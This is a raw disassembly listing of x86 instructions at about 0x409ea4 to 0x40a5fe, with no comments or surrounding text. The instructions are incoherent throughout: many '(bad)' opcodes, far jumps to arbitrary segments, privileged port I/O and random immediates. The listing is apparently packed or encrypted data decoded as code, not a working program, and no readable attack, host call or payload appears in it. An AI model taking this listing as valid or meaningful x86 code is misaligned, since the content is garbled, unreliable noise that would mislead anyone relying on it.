  409ea4:	mov    cl,0x6b
  409ea6:	scas   al,BYTE PTR es:[edi]
  409ea7:	rol    BYTE PTR [ebx],0x9b
  409eaa:	mov    eax,0x35889d1e
  409eaf:	push   esp
  409eb0:	stos   BYTE PTR es:[edi],al
  409eb1:	add    eax,DWORD PTR [esi]
  409eb3:	lahf   
  409eb4:	pop    eax
  409eb5:	mov    DWORD PTR [edi+0xc],ecx
  409eb8:	push   ecx
  409eb9:	adc    DWORD PTR [eax+edi*2],esi
  409ebc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ebd:	push   0x70c73840
  409ec2:	addr16 push ds
  409ec4:	or     al,0xdd
  409ec6:	inc    edi
  409ec7:	push   ebx
  409ec8:	jmp    0x2b1:0x37cedc8
  409ecf:	sbb    al,BYTE PTR [ebx-0x48]
  409ed2:	mov    al,ds:0x50a0c159
  409ed7:	dec    ecx
  409ed8:	ins    BYTE PTR es:[edi],dx
  409ed9:	popf   
  409eda:	mov    esi,0xd34858a7
  409edf:	mov    edi,0xd93a213d
  409ee4:	lods   eax,DWORD PTR ds:[esi]
  409ee5:	add    al,0xbc
  409ee7:	jno    0x409e98
  409ee9:	sbb    eax,0x2789989d
  409eee:	pop    ebx
  409eef:	gs ins BYTE PTR es:[edi],dx
  409ef1:	sub    eax,0x1a2e3d5a
  409ef6:	jl     0x409ebe
  409ef8:	rcl    DWORD PTR [edx+0x44],cl
  409efb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409efc:	inc    esi
  409efd:	test   BYTE PTR [edi+0x69],al
  409f00:	and    al,0xc1
  409f02:	dec    eax
  409f03:	cmp    BYTE PTR [esi-0x4e45190b],dh
  409f09:	push   ebp
  409f0a:	push   ebx
  409f0b:	imul   esi,edx,0xffffff8b
  409f0e:	adc    al,0x1e
  409f10:	inc    ebx
  409f11:	jns    0x409f01
  409f13:	popa   
  409f14:	mov    bh,0x28
  409f16:	adc    eax,0x6af31811
  409f1b:	rcl    DWORD PTR [eax-0x27],0x59
  409f1f:	mov    edi,0x8dd7206a
  409f24:	mov    cs,WORD PTR [edx+edx*2]
  409f27:	lods   eax,DWORD PTR ds:[esi]
  409f28:	clc    
  409f29:	cmpxchg DWORD PTR [esi+edi*1],edx
  409f2d:	jno    0x409f9b
  409f2f:	int    0x5
  409f31:	sbb    DWORD PTR [ebx-0x55],esi
  409f34:	mov    bh,cl
  409f36:	jb     0x409fb4
  409f38:	popa   
  409f39:	hlt    
  409f3a:	xor    al,0xdb
  409f3c:	cmp    ch,BYTE PTR [esi+ebx*8]
  409f3f:	xor    edx,ebx
  409f41:	mov    eax,0xf6afadf6
  409f46:	fwait
  409f47:	lods   al,BYTE PTR ds:[esi]
  409f48:	sub    eax,0xfb0e7402
  409f4d:	in     al,0x1b
  409f4f:	cld    
  409f50:	stos   DWORD PTR es:[edi],eax
  409f51:	fmulp  st(1),st
  409f53:	or     BYTE PTR [ebp-0x72],ah
  409f56:	stos   BYTE PTR es:[edi],al
  409f57:	adc    al,0xf3
  409f59:	adc    esp,DWORD PTR [ebx+0x1b5e03e3]
  409f5f:	jmp    0xdb9:0x72bb49c9
  409f66:	enter  0x55a,0x21
  409f6a:	push   ds
  409f6b:	rcl    ebp,1
  409f6d:	mov    ds:0xbb67a100,eax
  409f72:	push   ss
  409f73:	and    DWORD PTR [esi],esp
  409f75:	cmc    
  409f76:	cli    
  409f77:	nop
  409f78:	inc    esp
  409f79:	cmc    
  409f7a:	sbb    al,0x8a
  409f7c:	fwait
  409f7d:	sbb    BYTE PTR [edx-0x1e],ch
  409f80:	xchg   edi,eax
  409f81:	lods   eax,DWORD PTR ds:[esi]
  409f82:	mov    eax,ds:0x52ec845e
  409f87:	and    BYTE PTR [ecx-0x68],ah
  409f8a:	neg    BYTE PTR [esp+esi*1-0x67]
  409f8e:	jmp    0x4104:0x57d75d73
  409f95:	out    0x37,al
  409f97:	call   0xb5905506
  409f9c:	dec    BYTE PTR [ebx-0x5f477b1e]
  409fa2:	pop    edi
  409fa3:	bound  ebx,QWORD PTR [ecx]
  409fa5:	pushf  
  409fa6:	ins    DWORD PTR es:[edi],dx
  409fa7:	shr    DWORD PTR [edi],1
  409fa9:	retf   0x1dd4
  409fac:	xchg   ecx,eax
  409fad:	retf   0xed58
  409fb0:	xchg   BYTE PTR [edi*4+0x651820fe],cl
  409fb7:	cmp    ebp,DWORD PTR [edi+eiz*4]
  409fba:	inc    ebp
  409fbb:	mov    dh,0x15
  409fbd:	mov    edi,0x3695afd8
  409fc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fc3:	lahf   
  409fc4:	out    0x7f,al
  409fc6:	jne    0x409fca
  409fc8:	je     0x409f8c
  409fca:	push   ebx
  409fcb:	add    ch,cl
  409fcd:	shl    BYTE PTR [edx],0x37
  409fd0:	iret   
  409fd1:	fst    st(1)
  409fd3:	int3   
  409fd4:	xchg   ecx,eax
  409fd5:	arpl   WORD PTR [ebx],cx
  409fd7:	loopne 0x40a035
  409fd9:	push   0xff0e9b44
  409fde:	lea    edx,[ecx+0x8]
  409fe1:	jnp    0x409f84
  409fe3:	mov    ebx,0x604dd65c
  409fe8:	into   
  409fe9:	popf   
  409fea:	pop    esi
  409feb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fec:	add    eax,0xd6980815
  409ff1:	xchg   ebp,eax
  409ff2:	js     0x409fe1
  409ff4:	daa    
  409ff5:	imul   esp,esp,0xb633218b
  409ffb:	pop    edi
  409ffc:	xchg   BYTE PTR [bx+di-0x4b],ch
  40a000:	out    dx,al
  40a001:	add    ebp,DWORD PTR [bx+si-0xd]
  40a005:	shl    ebp,cl
  40a007:	jp     0x40a060
  40a009:	les    esi,FWORD PTR [edi]
  40a00b:	retf   
  40a00c:	jecxz  0x40a063
  40a00e:	push   edx
  40a00f:	mov    edx,0x54fba850
  40a014:	out    0x61,al
  40a016:	xchg   edi,eax
  40a017:	dec    eax
  40a018:	sar    DWORD PTR [edx-0x6d9a922a],cl
  40a01e:	leave  
  40a01f:	das    
  40a020:	test   DWORD PTR [ecx],ebx
  40a022:	(bad)
  40a026:	lods   eax,DWORD PTR ds:[esi]
  40a027:	fstp   QWORD PTR [edi]
  40a029:	or     edi,DWORD PTR [ecx]
  40a02b:	loopne 0x40a0a2
  40a02d:	stos   DWORD PTR es:[edi],eax
  40a02e:	xchg   edi,eax
  40a02f:	xchg   esp,eax
  40a030:	mov    bl,0x27
  40a032:	pop    ebp
  40a033:	lods   al,BYTE PTR ds:[esi]
  40a034:	mov    WORD PTR [eax],gs
  40a036:	aaa    
  40a037:	stos   BYTE PTR es:[edi],al
  40a038:	adc    DWORD PTR [ecx+ebx*1+0x14e3ee2a],edx
  40a03f:	mov    eax,0x6681c8ba
  40a044:	shl    BYTE PTR [edi-0x36],1
  40a047:	imul   edx,DWORD PTR [ebx-0x3a27c04d],0x63
  40a04e:	(bad)  [ebp-0x74f8e11]
  40a054:	in     eax,dx
  40a055:	push   ebx
  40a056:	jo     0x40a0cc
  40a058:	xchg   esp,eax
  40a059:	mov    dl,0xa1
  40a05b:	adc    al,0x17
  40a05d:	sub    bh,al
  40a05f:	sahf   
  40a060:	mov    edi,0xf00675b6
  40a065:	into   
  40a066:	cmp    edx,DWORD PTR [esi-0xfd0303b]
  40a06c:	out    dx,al
  40a06d:	fsubr  st,st(6)
  40a06f:	mov    edx,0x8e55d73b
  40a074:	inc    esi
  40a075:	inc    esi
  40a076:	(bad)  
  40a077:	lods   eax,DWORD PTR ds:[esi]
  40a078:	scas   eax,DWORD PTR es:[edi]
  40a079:	mov    WORD PTR [ebp-0x29e12dff],es
  40a07f:	(bad)  
  40a080:	mov    ah,0x6e
  40a082:	das    
  40a083:	test   dl,bh
  40a085:	test   DWORD PTR [edx],esi
  40a087:	mov    ah,0xa2
  40a089:	sbb    dh,dl
  40a08b:	jae    0x40a107
  40a08d:	ds dec edx
  40a08f:	dec    edx
  40a090:	aam    0x95
  40a092:	fild   QWORD PTR [edx+0x252177db]
  40a098:	nop
  40a099:	pop    edi
  40a09a:	xor    al,0x76
  40a09c:	scas   eax,DWORD PTR es:[edi]
  40a09d:	dec    esp
  40a09e:	imul   esi,DWORD PTR [ebp-0x1f],0x875ce151
  40a0a5:	jne    0x40a0b2
  40a0a7:	add    eax,0x5c40c033
  40a0ac:	(bad)  
  40a0ad:	and    eax,0x5603bcbe
  40a0b2:	das    
  40a0b3:	lods   al,BYTE PTR ds:[esi]
  40a0b4:	mov    dl,0x7d
  40a0b6:	sar    bl,0x4d
  40a0b9:	push   cs
  40a0ba:	push   0x4a04d5bb
  40a0bf:	add    al,0x88
  40a0c1:	push   eax
  40a0c2:	inc    esi
  40a0c3:	jae    0x40a129
  40a0c5:	ins    DWORD PTR es:[edi],dx
  40a0c6:	or     BYTE PTR [edi+0x50],cl
  40a0c9:	popf   
  40a0ca:	or     al,0xe0
  40a0cc:	inc    esi
  40a0cd:	dec    edi
  40a0ce:	jecxz  0x40a0de
  40a0d0:	pop    edi
  40a0d1:	pop    es
  40a0d2:	push   ebx
  40a0d3:	push   0x6504ef34
  40a0d8:	sub    eax,0x4558f29b
  40a0dd:	aad    0xab
  40a0df:	push   esi
  40a0e0:	xchg   esi,eax
  40a0e1:	scas   eax,DWORD PTR es:[edi]
  40a0e2:	mov    esp,0xe28fdf51
  40a0e7:	ss sti 
  40a0e9:	and    DWORD PTR [eax],ebp
  40a0eb:	shl    edx,1
  40a0ed:	test   eax,0x9348e316
  40a0f2:	mov    cl,0xf5
  40a0f4:	inc    edx
  40a0f5:	xor    eax,0x2996ca33
  40a0fa:	mov    WORD PTR [ecx+0x6d],ss
  40a0fd:	jg     0x40a109
  40a0ff:	aam    0x2a
  40a101:	jp     0x40a145
  40a103:	stos   DWORD PTR es:[edi],eax
  40a104:	and    DWORD PTR [ebx+0x66],ebx
  40a107:	je     0x40a0b2
  40a109:	push   edi
  40a10a:	sbb    al,0x9d
  40a10c:	ins    BYTE PTR es:[edi],dx
  40a10d:	dec    eax
  40a10e:	mov    ch,0xd1
  40a110:	lahf   
  40a111:	add    edx,esp
  40a113:	or     bl,BYTE PTR [ebx+0x7c]
  40a116:	jl     0x40a0dd
  40a118:	jmp    0xf3a3:0xe87fc303
  40a11f:	lock cmp esi,DWORD PTR [edx+ecx*4-0x412a2e61]
  40a127:	shl    BYTE PTR [esi+0x52],0xec
  40a12b:	xchg   edx,eax
  40a12c:	lock fbld TBYTE PTR [edi+0x6b]
  40a130:	repnz pop ss
  40a132:	ss ins BYTE PTR es:[edi],dx
  40a134:	fwait
  40a135:	mov    al,ds:0x8385d020
  40a13a:	fidivr DWORD PTR [edx+0x3f]
  40a13d:	nop
  40a13e:	sub    DWORD PTR [ebx],edi
  40a140:	enter  0x987,0x26
  40a144:	cmp    ebx,esp
  40a146:	pushf  
  40a147:	sti    
  40a148:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a149:	adc    eax,0x25cf6430
  40a14e:	in     eax,dx
  40a14f:	in     eax,0x9a
  40a151:	mov    ecx,DWORD PTR [ecx+0x14ca1ada]
  40a157:	sub    al,dl
  40a159:	pop    es
  40a15a:	imul   esp,esi,0xc9e3eef8
  40a160:	xchg   cl,dh
  40a162:	or     bl,BYTE PTR ss:[edx-0x5030b449]
  40a169:	sub    eax,DWORD PTR [ecx+0x68]
  40a16c:	shl    BYTE PTR [esi+ebp*4+0x238b03e1],0x9c
  40a174:	mov    cl,0xb2
  40a176:	ja     0x40a1b7
  40a178:	adc    DWORD PTR [edx-0x2d],ebp
  40a17b:	xchg   edi,eax
  40a17c:	rcl    BYTE PTR [edx+ebx*2],0xd
  40a180:	clc    
  40a181:	in     al,0xb6
  40a183:	in     al,0xfc
  40a185:	jae    0x40a197
  40a187:	xchg   ebx,ebp
  40a189:	pop    esi
  40a18a:	(bad)  
  40a18b:	dec    ecx
  40a18c:	mov    al,0xc4
  40a18e:	xor    dl,BYTE PTR [edi+0x5f]
  40a191:	add    eax,0xef8eb96e
  40a196:	push   0xffffffab
  40a198:	leave  
  40a199:	retf   
  40a19a:	cmc    
  40a19b:	cmp    bh,BYTE PTR [ebp+0x69]
  40a19e:	or     eax,0x516c924d
  40a1a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a1a4:	or     al,0x45
  40a1a6:	mov    ebp,0x156ff5fe
  40a1ab:	sbb    eax,0x8690b8ff
  40a1b0:	sbb    ecx,DWORD PTR [edx+0x5f]
  40a1b3:	jge    0x40a172
  40a1b5:	push   esp
  40a1b6:	pop    esi
  40a1b7:	scas   al,BYTE PTR es:[edi]
  40a1b8:	imul   ecx,DWORD PTR [esi],0x26254be9
  40a1be:	(bad)  
  40a1bf:	mov    al,ds:0xf4d01415
  40a1c4:	xchg   esi,eax
  40a1c5:	js     0x40a160
  40a1c7:	xor    bh,BYTE PTR [esi+0x3602c20a]
  40a1cd:	add    DWORD PTR [esi+0x72],edx
  40a1d0:	mov    ecx,0x86b93b88
  40a1d5:	or     al,0x63
  40a1d7:	addr16 push ebx
  40a1d9:	sub    BYTE PTR [ebx+0x7a60959d],cl
  40a1df:	mov    edx,0x2a24d784
  40a1e4:	neg    al
  40a1e6:	xchg   esi,eax
  40a1e7:	jns    0x40a1ac
  40a1e9:	icebp  
  40a1ea:	add    cl,cl
  40a1ec:	cmp    esi,DWORD PTR [eax+0x72]
  40a1ef:	lahf   
  40a1f0:	out    0xc,eax
  40a1f2:	nop    ecx
  40a1f5:	xlat   BYTE PTR ds:[ebx]
  40a1f6:	out    0x43,eax
  40a1f8:	retf   
  40a1f9:	pusha  
  40a1fa:	jbe    0x40a24a
  40a1fc:	mov    dl,0x11
  40a1fe:	add    esi,0x4a9db964
  40a204:	int    0x5f
  40a206:	ds (bad) 
  40a208:	gs push es
  40a20a:	push   0x9c2f5d14
  40a20f:	stos   BYTE PTR es:[edi],al
  40a210:	retf   0xa133
  40a213:	aad    0x45
  40a215:	pop    esi
  40a216:	mov    ah,BYTE PTR [ebp-0x2593b2ce]
  40a21c:	sbb    bl,bh
  40a21e:	push   eax
  40a21f:	adc    al,0xda
  40a221:	and    BYTE PTR [edi+0x0],bl
  40a224:	sub    eax,esi
  40a226:	pusha  
  40a227:	mov    dh,0x28
  40a229:	jp     0x40a204
  40a22b:	rcr    BYTE PTR [esi-0xa25703f],0xf1
  40a232:	cmp    BYTE PTR [ecx],al
  40a234:	ins    DWORD PTR es:[edi],dx
  40a235:	pop    ds
  40a236:	push   0xc671481a
  40a23b:	iret   
  40a23c:	into   
  40a23d:	imul   ebx,DWORD PTR [ebx+0x57],0xaceab62e
  40a244:	stc    
  40a245:	js     0x40a270
  40a247:	push   edx
  40a248:	call   0xe241:0x5fb00442
  40a24f:	jmp    0x53e7d5df
  40a254:	retf   0x717f
  40a257:	push   ecx
  40a258:	aad    0x39
  40a25a:	scas   eax,DWORD PTR es:[edi]
  40a25b:	das    
  40a25c:	cmp    ebp,DWORD PTR [ebx]
  40a25e:	inc    ecx
  40a25f:	fld    TBYTE PTR [esi+eiz*8]
  40a262:	jg     0x40a22a
  40a264:	sub    al,0x4b
  40a266:	mov    ah,0x36
  40a268:	pop    ebx
  40a269:	cmp    DWORD PTR ds:0xbeedaa91,eax
  40a26f:	xchg   esp,eax
  40a270:	fsubr  DWORD PTR [esi]
  40a272:	hlt    
  40a273:	out    dx,eax
  40a274:	test   DWORD PTR [ecx+0x2],0x89237003
  40a27b:	adc    DWORD PTR [edi],ebp
  40a27d:	(bad)  
  40a27e:	mov    ds:0xc8913203,al
  40a283:	retf   0x50be
  40a286:	adc    BYTE PTR [esi],dh
  40a288:	mov    bh,0xce
  40a28a:	mov    bl,0xe1
  40a28c:	jg     0x40a2d6
  40a28e:	mul    BYTE PTR ds:0x6233665b
  40a294:	xlat   BYTE PTR ds:[ebx]
  40a295:	das    
  40a296:	leave  
  40a297:	mov    al,ds:0x9510f34
  40a29c:	mov    BYTE PTR [esi-0x23],0xc5
  40a2a0:	pop    edx
  40a2a1:	rol    BYTE PTR [edx],0xef
  40a2a4:	xchg   ebp,eax
  40a2a5:	lock push ebx
  40a2a7:	mov    ecx,ecx
  40a2a9:	fsub   QWORD PTR [ebp-0x50]
  40a2ac:	cmp    DWORD PTR [ebx],esi
  40a2ae:	out    dx,eax
  40a2af:	fucom  st(4)
  40a2b1:	push   ds
  40a2b2:	les    ecx,FWORD PTR [edx+0x6]
  40a2b5:	out    dx,al
  40a2b6:	jbe    0x40a244
  40a2b8:	loopne 0x40a2f2
  40a2ba:	pusha  
  40a2bb:	arpl   di,dx
  40a2bd:	xor    edi,edi
  40a2bf:	int3   
  40a2c0:	idiv   BYTE PTR [ecx-0x1a]
  40a2c3:	mov    es,WORD PTR [ebx+0x1b401547]
  40a2c9:	das    
  40a2ca:	mov    ds,WORD PTR ds:0x78c1389f
  40a2d0:	push   0xffffffe0
  40a2d2:	sub    al,BYTE PTR [edx-0xa8779f4]
  40a2d8:	addr16 xchg edi,eax
  40a2da:	sbb    eax,0x1a8bfbf7
  40a2df:	or     DWORD PTR [eax+edi*1],esp
  40a2e2:	sbb    eax,0x5fbb9a98
  40a2e7:	inc    BYTE PTR [ecx+0x58]
  40a2ea:	imul   ebp,esi,0x7
  40a2ed:	sub    eax,0x189a9fce
  40a2f2:	ret    0xd807
  40a2f5:	cmp    DWORD PTR ds:0xcec5a919,ebp
  40a2fb:	aas    
  40a2fc:	cmp    al,0xe1
  40a2fe:	fsubr  QWORD PTR [edx]
  40a300:	adc    ebx,DWORD PTR [eax-0x2b759268]
  40a306:	mov    ds:0xfd9b8fcd,eax
  40a30b:	sar    DWORD PTR [edx+eiz*4-0x77],1
  40a30f:	in     al,0xe4
  40a311:	(bad)  
  40a312:	lock jb 0x40a36d
  40a315:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a316:	in     eax,dx
  40a317:	dec    eax
  40a318:	jp     0x40a36e
  40a31a:	mov    bh,0xd6
  40a31c:	dec    edi
  40a31d:	jp     0x40a392
  40a31f:	inc    eax
  40a320:	sbb    al,0x3f
  40a322:	jg     0x40a372
  40a324:	and    dl,dl
  40a326:	cdq    
  40a327:	pop    esp
  40a328:	mov    ebp,0x42d79a21
  40a32d:	cmp    ebx,DWORD PTR [edx]
  40a32f:	sub    eax,0x6b184140
  40a334:	mov    ecx,0xc2cd5f43
  40a339:	jl     0x40a305
  40a33b:	pop    edx
  40a33c:	fdiv   QWORD PTR [edx-0x26]
  40a33f:	adc    BYTE PTR [ebx-0x2c39ca62],bl
  40a345:	mov    al,ds:0xdf905441
  40a34a:	in     al,dx
  40a34b:	test   eax,0x60b22519
  40a350:	sub    eax,0x245360af
  40a355:	mov    ds:0x32d29a24,eax
  40a35a:	pop    ss
  40a35b:	xor    esi,DWORD PTR [ebx-0x6f01f180]
  40a361:	(bad)  
  40a362:	add    DWORD PTR [eax+0xc4f24a0],ebp
  40a368:	adc    BYTE PTR [esi+0x11],dl
  40a36b:	and    al,0x2c
  40a36d:	pop    es
  40a36e:	and    eax,0x4b8a518e
  40a373:	(bad)  
  40a374:	fbld   TBYTE PTR [edi-0x58]
  40a377:	outs   dx,BYTE PTR ds:[esi]
  40a378:	push   es
  40a379:	cwde   
  40a37a:	sub    DWORD PTR [ecx-0x6fa88fd],ebx
  40a380:	and    BYTE PTR gs:[eax+0x59],0xa5
  40a385:	scas   al,BYTE PTR es:[edi]
  40a386:	std    
  40a387:	fs repz mov bl,0x31
  40a38b:	adc    BYTE PTR [esi-0x41],dh
  40a38e:	adc    DWORD PTR [ebp+0x6],ecx
  40a391:	adc    edx,DWORD PTR [eax+0x11664edd]
  40a397:	mov    ebx,0x5cbf9339
  40a39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a39d:	(bad)  
  40a39e:	shl    BYTE PTR [edx],cl
  40a3a0:	push   ds
  40a3a1:	outs   dx,BYTE PTR ds:[esi]
  40a3a2:	out    0xf1,al
  40a3a4:	pop    es
  40a3a5:	lahf   
  40a3a6:	jne    0x40a409
  40a3a8:	clc    
  40a3a9:	rcr    BYTE PTR [ebx+ecx*2],0x5d
  40a3ad:	dec    eax
  40a3ae:	cld    
  40a3af:	jle    0x40a3ea
  40a3b1:	jmp    0x3a27:0xdf868c07
  40a3b8:	push   ecx
  40a3b9:	push   ebp
  40a3ba:	gs inc ebx
  40a3bd:	scas   eax,DWORD PTR es:[edi]
  40a3be:	scas   eax,DWORD PTR es:[edi]
  40a3bf:	xchg   esi,eax
  40a3c0:	jl     0x40a365
  40a3c2:	cmp    edi,ebx
  40a3c4:	jmp    0xc718:0xac14b205
  40a3cb:	pop    edi
  40a3cc:	add    BYTE PTR [eax+0x51],cl
  40a3cf:	sbb    esi,edi
  40a3d1:	pop    edi
  40a3d2:	jne    0xde1715cf
  40a3d8:	inc    eax
  40a3d9:	stos   DWORD PTR es:[edi],eax
  40a3da:	in     eax,0xdd
  40a3dc:	xor    eax,0x5bf7e4f9
  40a3e1:	sub    dl,BYTE PTR [ebx-0x7503e486]
  40a3e7:	jmp    0x3cd5f48
  40a3ec:	popa   
  40a3ed:	or     BYTE PTR [eax-0x18],0x83
  40a3f1:	adc    eax,ebx
  40a3f3:	std    
  40a3f4:	lods   al,BYTE PTR ds:[esi]
  40a3f5:	fwait
  40a3f6:	sbb    eax,DWORD PTR [eax+0x6c]
  40a3f9:	mov    esp,0x36b985a7
  40a3fe:	aam    0xb7
  40a400:	lods   eax,DWORD PTR ds:[esi]
  40a401:	add    edi,esi
  40a403:	(bad)  
  40a404:	sub    esi,DWORD PTR [esi+0x7b7dcb6]
  40a40a:	jmp    0xafe14b2f
  40a40f:	sub    eax,0xf117b946
  40a414:	mov    ecx,eax
  40a416:	inc    ebx
  40a417:	cmp    DWORD PTR [ebx+0x17ce34ba],esi
  40a41d:	dec    ebx
  40a41e:	ffree  st(4)
  40a420:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a421:	adc    ebx,DWORD PTR [edx-0x7e]
  40a424:	out    dx,al
  40a425:	dec    ebx
  40a426:	add    BYTE PTR [edi],0x7e
  40a429:	cmp    DWORD PTR [ebx-0x6cbf9550],esp
  40a42f:	add    al,0x7a
  40a431:	scas   eax,DWORD PTR es:[edi]
  40a432:	sbb    eax,0xf88b2839
  40a437:	mov    cr7,eax
  40a43a:	outs   dx,BYTE PTR ds:[esi]
  40a43b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a43c:	sub    bh,al
  40a43e:	loope  0x40a4b0
  40a440:	dec    ebx
  40a441:	pop    ebp
  40a442:	test   DWORD PTR [ebp+0x4f47b7bb],esp
  40a448:	stc    
  40a449:	dec    eax
  40a44a:	add    ecx,DWORD PTR [ebp+ecx*1+0x377fd48c]
  40a451:	adc    al,0xee
  40a454:	iret   
  40a455:	jle    0x40a3e9
  40a457:	mov    esi,0x9649c3c5
  40a45c:	or     BYTE PTR [ecx-0x52],al
  40a45f:	inc    esp
  40a460:	fwait
  40a461:	mov    esi,0xe155ee7b
  40a466:	ret    0x545
  40a469:	clc    
  40a46a:	mov    esi,DWORD PTR [esi]
  40a46c:	dec    DWORD PTR [ebx+0x6]
  40a46f:	inc    ecx
  40a470:	jb     0x40a4bd
  40a472:	pop    es
  40a473:	and    bl,BYTE PTR [esi+0x52]
  40a476:	outs   dx,BYTE PTR ds:[esi]
  40a477:	mov    ebp,0xeacce0da
  40a47c:	inc    ecx
  40a47d:	out    dx,eax
  40a47e:	mov    al,0x2c
  40a480:	sub    BYTE PTR [ebx+0x1b742cf8],bl
  40a486:	std    
  40a487:	ins    BYTE PTR es:[edi],dx
  40a488:	(bad)  ds:0x4e9a0640
  40a48e:	jle    0x40a49c
  40a490:	imul   BYTE PTR [ecx+esi*1+0x1f]
  40a494:	sar    DWORD PTR [di-0x217c],1
  40a499:	(bad)  
  40a49a:	(bad)  
  40a49c:	out    dx,eax
  40a49d:	outs   dx,DWORD PTR ds:[esi]
  40a49e:	mov    edx,ss
  40a4a0:	inc    esi
  40a4a1:	fstp   QWORD PTR [esi-0x3bebbdbe]
  40a4a7:	push   edi
  40a4a8:	mov    ebx,0x29f533a7
  40a4ad:	fcmovne st,st(6)
  40a4af:	inc    eax
  40a4b0:	jecxz  0x40a4f9
  40a4b2:	xchg   edx,eax
  40a4b3:	mov    cl,BYTE PTR [eax]
  40a4b5:	inc    ebp
  40a4b6:	std    
  40a4b7:	fldcw  WORD PTR [edx+0x404364de]
  40a4bd:	or     cl,BYTE PTR [ecx]
  40a4bf:	mov    cl,0x86
  40a4c1:	popa   
  40a4c2:	dec    edx
  40a4c3:	xor    BYTE PTR ds:0x20a99012,ah
  40a4c9:	and    al,0x6b
  40a4cb:	inc    ebp
  40a4cc:	xchg   ebp,eax
  40a4cd:	sub    eax,0xac04f837
  40a4d2:	(bad)  
  40a4d3:	sub    eax,0x4b055a31
  40a4d8:	dec    ebx
  40a4d9:	xor    esp,DWORD PTR [ecx-0x1c558309]
  40a4df:	addr16 popf 
  40a4e1:	xchg   edi,eax
  40a4e2:	inc    ebp
  40a4e3:	test   DWORD PTR [esi-0x797e0e02],edx
  40a4e9:	retf   0x33a9
  40a4ec:	and    BYTE PTR ds:0x23437713,bl
  40a4f2:	jae    0x40a4a2
  40a4f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4f5:	fisttp QWORD PTR [esi+0x30dd6d09]
  40a4fb:	mov    ecx,edx
  40a4fd:	popf   
  40a4fe:	das    
  40a4ff:	outs   dx,BYTE PTR ds:[esi]
  40a500:	fsub   DWORD PTR [eax+eiz*4+0x25bb7a83]
  40a507:	aam    0x72
  40a509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a50a:	(bad)  
  40a50b:	sub    DWORD PTR [ebx],eax
  40a50d:	(bad)  
  40a50e:	cmp    ebp,DWORD PTR [edi-0x49]
  40a511:	adc    bh,ch
  40a513:	(bad)  
  40a514:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a515:	ins    BYTE PTR es:[edi],dx
  40a516:	sub    esp,esp
  40a518:	inc    esp
  40a519:	bound  edx,QWORD PTR [edx]
  40a51b:	inc    esp
  40a51c:	mov    al,0x60
  40a51e:	(bad)  
  40a520:	cdq    
  40a521:	(bad)  
  40a522:	stos   DWORD PTR es:[edi],eax
  40a523:	xor    BYTE PTR [edx],al
  40a525:	or     BYTE PTR [eax+0x64],0xa7
  40a529:	int3   
  40a52a:	jno    0x40a55c
  40a52c:	in     eax,0x20
  40a52e:	dec    esp
  40a52f:	inc    edx
  40a530:	jnp    0x40a580
  40a532:	inc    esi
  40a533:	sub    ch,ah
  40a535:	fiadd  DWORD PTR [esi]
  40a537:	scas   eax,DWORD PTR es:[edi]
  40a538:	(bad)  
  40a539:	xchg   esi,eax
  40a53a:	push   edx
  40a53b:	test   BYTE PTR [eax-0x62],bh
  40a53e:	cdq    
  40a53f:	jmp    0x40a530
  40a541:	xchg   BYTE PTR [eax],al
  40a543:	jle    0x40a587
  40a545:	mov    ds:0x68fcbb09,eax
  40a54a:	fcmove st,st(2)
  40a54c:	mov    edi,0x78fc16d0
  40a551:	fidiv  DWORD PTR [eax+esi*2-0x15]
  40a555:	inc    edx
  40a556:	push   eax
  40a557:	nop
  40a558:	push   edi
  40a559:	in     al,dx
  40a55a:	sbb    BYTE PTR [ecx+0x40],0xc9
  40a55e:	(bad)  
  40a560:	xchg   ebp,eax
  40a561:	sub    eax,DWORD PTR [edx+0x7ac95dca]
  40a567:	and    DWORD PTR [edx+0x58],esi
  40a56a:	fwait
  40a56b:	or     eax,0xeda37462
  40a570:	inc    ecx
  40a571:	aas    
  40a572:	shr    edi,cl
  40a574:	mov    bl,0x55
  40a576:	push   0x5c
  40a578:	mov    al,0x91
  40a57a:	dec    BYTE PTR [ecx]
  40a57c:	pop    esi
  40a57d:	inc    ebp
  40a57e:	into   
  40a57f:	sbb    ecx,DWORD PTR [edx+0x8]
  40a582:	in     al,dx
  40a583:	push   esp
  40a584:	mov    esp,0x5bbbe2e9
  40a589:	push   esi
  40a58a:	inc    eax
  40a58b:	or     esi,0xedee869a
  40a591:	fwait
  40a592:	mul    BYTE PTR [edi-0x46a68d97]
  40a598:	imul   eax,DWORD PTR [edx+ebp*2+0x12],0x2f89b22a
  40a5a0:	lock pushf 
  40a5a2:	jo     0x40a5bd
  40a5a4:	cs mov ah,0x82
  40a5a7:	push   es
  40a5a8:	fsub   DWORD PTR [ebp+0x60c524db]
  40a5ae:	cmp    DWORD PTR [edi+0x7a],ecx
  40a5b1:	fmul   QWORD PTR [edi+esi*2-0x78]
  40a5b5:	add    ah,BYTE PTR [eax-0x7831b576]
  40a5bb:	mov    ds:0xfc8f38ef,eax
  40a5c0:	jl     0x40a597
  40a5c2:	daa    
  40a5c3:	or     ebx,eax
  40a5c5:	cld    
  40a5c6:	fldcw  WORD PTR [esi+eax*4+0x7342e8d]
  40a5cd:	lea    esi,[ecx+0x7d]
  40a5d0:	mov    esi,0x2f60f109
  40a5d5:	jmp    0x5efc6cd9
  40a5da:	nop
  40a5db:	popa   
  40a5dc:	repz jne 0x40a59e
  40a5df:	xlat   BYTE PTR ds:[ebx]
  40a5e0:	or     eax,0x503f025
  40a5e5:	sbb    ecx,DWORD PTR [ebx]
  40a5e7:	out    dx,eax
  40a5e8:	cld    
  40a5e9:	inc    eax
  40a5ea:	mov    eax,DWORD PTR [edx-0x7c44a9d5]
  40a5f0:	mov    dl,ch
  40a5f2:	call   0xbf48:0xa59a3949
  40a5f9:	cdq    
  40a5fa:	add    al,0x95
  40a5fc:	inc    edx
  40a5fd:	inc    edi
  40a5fe:	mov    bl,0xea
